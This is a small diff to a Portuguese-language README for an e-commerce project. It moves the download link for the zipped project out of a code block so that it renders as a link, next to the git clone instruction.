@@ -24,10 +24,8 @@ Clone o projeto utilizando:
 git clone https://github.com/ASouzaCruz/ecommerce.git
 ```
 Arquivo zipado:
-``` 
-[Link do download do projeto zipado](https://github.com/user-attachments/files/29183110/ecommerce-master.zip)
 
-```
+[Link do download do projeto zipado](https://github.com/user-attachments/files/29183110/ecommerce-master.zip)
 
 Acesse a pasta do projeto:
 
